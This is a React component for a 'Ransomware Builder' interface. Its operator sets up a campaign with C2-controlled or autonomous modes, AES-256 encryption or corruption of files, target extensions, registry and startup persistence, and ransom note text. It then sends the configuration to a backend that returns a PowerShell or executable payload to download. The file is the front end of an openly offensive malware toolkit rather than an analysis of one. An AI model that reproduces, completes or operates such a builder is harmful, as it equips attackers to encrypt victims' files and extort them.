import React, { useState, useEffect } from 'react';
import { Flame, Command, Shield, Upload, Download, Settings, AlertTriangle } from 'lucide-react';

const RansomBuilder = () => {
  const [campaign, setCampaign] = useState({
    name: '',
    mode: 'fire_forget',
    payloadType: 'encryption',
    encryption: {
      algorithm: 'AES-256-CBC',
      keySize: 256
    },
    communication: {
      method: 'tor',
      chatUrl: '',
      noteUrl: ''
    },
    persistence: {
      registry: true,
      startup: true,
      scheduled: false
    },
    targeting: {
      extensions: ['.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.jpg', '.png', '.mp4'],
      excludePaths: ['C:\\Windows', 'C:\\Program Files'],
      maxFileSize: 100 * 1024 * 1024 // 100MB
    },
    selfDestruct: {
      enabled: true,
      delay: 0,
      message: 'System has been compromised. Contact support for recovery.'
    },
    notification: {
      type: 'popup', // 'popup' or 'permanent'
      message: 'Your files have been encrypted with ARClol ransomware. Contact support for recovery.',
      title: 'ARClol Ransomware Alert'
    },
    outputFormat: 'ps1'
  });

  const [building, setBuilding] = useState(false);
  const [buildStatus, setBuildStatus] = useState(null);

  const handleModeChange = (mode) => {
    setCampaign(prev => ({ ...prev, mode }));
  };

  const handleBuild = async () => {
    setBuilding(true);
    setBuildStatus({ status: 'building', message: 'Building payload...' });

    try {
      const token = localStorage.getItem('token');
      console.log('Token from localStorage:', token ? 'Token exists' : 'No token found');
      
      if (!token) {
        throw new Error('No authentication token found. Please log in again.');
      }

      const response = await fetch('/api/ransom/build', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({
          ...campaign,
          compiler: 'gcc',
          optimizationLevel: 2,
          buildDir: 'build',
          outputFormat: campaign.outputFormat || 'exe'
        })
      });

      console.log('Response status:', response.status);
      console.log('Response headers:', response.headers);

      if (response.ok) {
        // Check if response is a file download
        const contentType = response.headers.get('content-type');
        const disposition = response.headers.get('content-disposition');
        
        if (contentType && contentType.includes('application/octet-stream')) {
          // Extract filename from Content-Disposition or fallback to requested format
          let filename = disposition?.match(/filename="?([^"]+)"?/)?.[1] ||
                         `${campaign.name || 'payload'}.${campaign.outputFormat || 'exe'}`;

          const blob = await response.blob();
          const url = window.URL.createObjectURL(blob);
          const a = document.createElement('a');
          a.style.display = 'none';
          a.href = url;
          a.download = filename;
          document.body.appendChild(a);
          a.click();
          window.URL.revokeObjectURL(url);
          setBuildStatus({ status: 'success', message: 'Build completed successfully! Download started.' });
        } else {
          const result = await response.json();
          setBuildStatus({ status: 'success', message: 'Build completed successfully', payload: result.payload });
        }
      } else {
        const errorData = await response.json().catch(() => ({ error: 'Unknown error' }));
        console.error('Build failed with status:', response.status, 'Error:', errorData);
        throw new Error(errorData.error || `Build failed with status ${response.status}`);
      }
    } catch (error) {
      console.error('Build error:', error);
      setBuildStatus({ status: 'error', message: 'Build failed: ' + error.message });
    } finally {
      setBuilding(false);
    }
  };

  const renderModeSelection = () => (
    <div className="mb-6">
      <h3 className="text-lg font-semibold mb-4">Mode Selection</h3>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div 
          onClick={() => handleModeChange('fire_forget')}
          className={`p-4 border rounded-lg cursor-pointer transition-all ${
            campaign.mode === 'fire_forget' ? 'border-red-500 bg-red-50' : 'border-gray-300'
          }`}
        >
          <div className="flex items-center mb-2">
            <Flame className="w-5 h-5 text-red-600 mr-2" />
            <h4 className="font-medium">Fire & Forget</h4>
          </div>
          <p className="text-sm text-gray-600">
            Autonomous suicide payload with no persistence or C2 communication
          </p>
        </div>
        
        <div 
          onClick={() => handleModeChange('controlled')}
          className={`p-4 border rounded-lg cursor-pointer transition-all ${
            campaign.mode === 'controlled' ? 'border-blue-500 bg-blue-50' : 'border-gray-300'
          }`}
        >
          <div className="flex items-center mb-2">
            <Command className="w-5 h-5 text-blue-600 mr-2" />
            <h4 className="font-medium">Controlled</h4>
          </div>
          <p className="text-sm text-gray-600">
            C2-managed operations with real-time control and victim monitoring
          </p>
        </div>
      </div>
    </div>
  );

  const renderConfiguration = () => (
    <div className="space-y-6">
      <div>
        <label className="block text-sm font-medium mb-2">Campaign Name</label>
        <input
          type="text"
          value={campaign.name}
          onChange={(e) => setCampaign(prev => ({ ...prev, name: e.target.value }))}
          className="w-full px-3 py-2 border rounded-md"
          placeholder="Enter campaign name"
        />
      </div>

      <div>
        <label className="block text-sm font-medium mb-2">Payload Type</label>
        <select
          value={campaign.payloadType}
          onChange={(e) => setCampaign(prev => ({ ...prev, payloadType: e.target.value }))}
          className="w-full px-3 py-2 border rounded-md"
        >
          <option value="encryption">File Encryption</option>
          <option value="corruption">File Corruption</option>
        </select>
      </div>

      <div>
        <label className="block text-sm font-medium mb-2">Target File Extensions</label>
        <textarea
          value={campaign.targeting.extensions.join(', ')}
          onChange={(e) => setCampaign(prev => ({
            ...prev,
            targeting: { ...prev.targeting, extensions: e.target.value.split(',').map(ext => ext.trim()) }
          }))}
          className="w-full px-3 py-2 border rounded-md"
          rows={3}
          placeholder=".txt, .doc, .pdf, etc."
        />
      </div>

      <div>
        <label className="block text-sm font-medium mb-2">Output Format</label>
        <select
          value={campaign.outputFormat || 'ps1'}
          onChange={(e) => setCampaign(prev => ({ ...prev, outputFormat: e.target.value }))}
          className="w-full px-3 py-2 border rounded-md"
        >
          <option value="ps1">PowerShell Script (.ps1)</option>
          <option value="exe">Executable (.exe)</option>
        </select>
      </div>

      <div>
        <label className="block text-sm font-medium mb-2">Notification Type</label>
        <select
          value={campaign.notification.type}
          onChange={(e) => setCampaign(prev => ({
            ...prev,
            notification: { ...prev.notification, type: e.target.value }
          }))}
          className="w-full px-3 py-2 border rounded-md"
        >
          <option value="popup">Popup Dialog (on .ARClol file open)</option>
          <option value="permanent">Permanent Window (always visible)</option>
        </select>
      </div>

      <div>
        <label className="block text-sm font-medium mb-2">Notification Message</label>
        <textarea
          value={campaign.notification.message}
          onChange={(e) => setCampaign(prev => ({
            ...prev,
            notification: { ...prev.notification, message: e.target.value }
          }))}
          className="w-full px-3 py-2 border rounded-md"
          rows={4}
          placeholder="Enter notification message for encrypted files"
        />
      </div>

      <div>
        <label className="block text-sm font-medium mb-2">Notification Title</label>
        <input
          type="text"
          value={campaign.notification.title}
          onChange={(e) => setCampaign(prev => ({
            ...prev,
            notification: { ...prev.notification, title: e.target.value }
          }))}
          className="w-full px-3 py-2 border rounded-md"
          placeholder="Enter notification title"
        />
      </div>

      <div>
        <label className="block text-sm font-medium mb-2">Ransom Note</label>
        <textarea
          value={campaign.selfDestruct.message}
          onChange={(e) => setCampaign(prev => ({
            ...prev,
            selfDestruct: { ...prev.selfDestruct, message: e.target.value }
          }))}
          className="w-full px-3 py-2 border rounded-md"
          rows={4}
          placeholder="Enter ransom note message"
        />
      </div>

      <div className="space-y-4">
        <label className="flex items-center">
          <input
            type="checkbox"
            checked={campaign.persistence.registry}
            onChange={(e) => setCampaign(prev => ({
              ...prev,
              persistence: { ...prev.persistence, registry: e.target.checked }
            }))}
            className="mr-2"
          />
          <span className="text-sm">Registry Persistence</span>
        </label>

        <label className="flex items-center">
          <input
            type="checkbox"
            checked={campaign.persistence.startup}
            onChange={(e) => setCampaign(prev => ({
              ...prev,
              persistence: { ...prev.persistence, startup: e.target.checked }
            }))}
            className="mr-2"
          />
          <span className="text-sm">Startup Folder Persistence</span>
        </label>
      </div>
    </div>
  );

  return (
    <div className="max-w-4xl mx-auto p-6">
      <div className="bg-white rounded-lg shadow-lg p-6">
        <div className="flex items-center mb-6">
          <Shield className="w-8 h-8 text-red-600 mr-3" />
          <h1 className="text-2xl font-bold text-gray-900">Ransomware Builder</h1>
        </div>

        {renderModeSelection()}
        {renderConfiguration()}

        <div className="mt-8">
          <button
            onClick={handleBuild}
            disabled={building || !campaign.name}
            className="w-full bg-red-600 text-white py-3 px-4 rounded-md hover:bg-red-700 disabled:bg-gray-400 disabled:cursor-not-allowed flex items-center justify-center"
          >
            {building ? (
              <>
                <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                Building...
              </>
            ) : (
              <>
                <Download className="w-4 h-4 mr-2" />
                Build Payload
              </>
            )}
          </button>
        </div>

        {buildStatus && (
          <div className={`mt-4 p-4 rounded-md ${
            buildStatus.status === 'success' ? 'bg-green-100 text-green-700' :
            buildStatus.status === 'error' ? 'bg-red-100 text-red-700' :
            'bg-blue-100 text-blue-700'
          }`}>
            <div className="flex items-center">
              <AlertTriangle className="w-4 h-4 mr-2" />
              {buildStatus.message}
            </div>
            {buildStatus.payload && (
              <div className="mt-2">
                <a 
                  href={`data:text/plain;charset=utf-8,${encodeURIComponent(buildStatus.payload)}`}
                  download={`${campaign.name || 'payload'}.exe`}
                  className="text-sm underline"
                >
                  Download Payload
                </a>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

export default RansomBuilder;
